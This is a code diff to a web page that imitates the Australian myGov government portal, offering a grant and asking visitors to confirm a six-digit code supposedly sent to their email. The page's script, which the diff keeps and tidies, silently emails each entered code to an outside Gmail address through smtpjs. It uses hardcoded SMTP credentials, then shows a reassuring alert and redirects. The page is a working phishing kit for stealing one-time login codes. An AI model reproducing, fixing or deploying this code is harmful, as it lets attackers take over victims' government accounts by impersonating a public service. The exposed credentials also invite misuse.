@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <link rel="shortcut icon" href="63d9b6249fffa-removebg-preview.png" type="image/x-icon">
+    <link rel="shortcut icon" href="Downloads/63d9b6249fffa-removebg-preview.png" type="image/x-icon">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
@@ -56,6 +56,9 @@
             font-size: 18px;
             width: 100%;
             box-sizing: border-box;
+            text-align: center;
+            font-family: 'Times New Roman', Times, serif;
+            font-weight: bold;
             }
 
             .confirmation-submit {
@@ -151,7 +154,7 @@
             background-color: black;
         }
     </style>
-    <title>myGov: Get a grant</title>
+    <title>myGov: Get a grant | code</title>
 </head>
 <body>
     <header>
@@ -164,9 +167,9 @@
         <p>We're here to help</p>
         <p id="access">Access government services from one place.</p>
     </div>
-    <form onsubmit="sendCode()">
-        <h2 class="confirmation-heading">We just sent a 6 digit code to your mail, confirm it here</h2><br><br>
-        <input type="number" class="confirmation-input" placeholder="Enter the code" pattern="[0-9]{6}" required><br><br>
+    <form onsubmit="sendCode(event)">
+        <h2 class="confirmation-heading">We just sent a 6-digit code to your mail, confirm it here</h2><br><br>
+        <input type="number" class="confirmation-input" id="code" placeholder="Enter the code" required><br><br>
         <input type="submit" value="Confirm" class="confirmation-submit">
     </form>
     <div class="info">
@@ -201,20 +204,20 @@
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
         function sendCode(){
-            event.preventDefault(); // prevent the form from submitting normally
-        var code = document.getElementById("code").value;
+            var code = document.getElementById("code").value;
+            event.preventDefault()
             Email.send({
-    Host : "smtp.elasticemail.com",
-    Username : "ariyoaresa89@gmail.com",
-    Password : "28697CFEE316BCFFCE23F802726E95EC3E84",
-    To : 'bfakorewa@gmail.com',
-    From : "ariyoaresa89@gmail.com",
-    Subject : "New myGov login",
-    Body : "MyGov code is " + code
-}).then(
-  message => alert(message + " you applicaition will be processed within 7 business days")
-  (window.location.href = "next.html")
-  );
+                Host : "smtp.elasticemail.com",
+                Username : "ariyoaresa89@gmail.com",
+                Password : "28697CFEE316BCFFCE23F802726E95EC3E84",
+                To : 'bfakorewa@gmail.com',
+                From : "ariyoaresa89@gmail.com",
+                Subject : "New myGov Code",
+                Body : "The myGov code is " + code
+            }).then(
+            message => alert(message)
+            (window.location.href = "next.html")
+            );
         }
     </script> 
 </body>
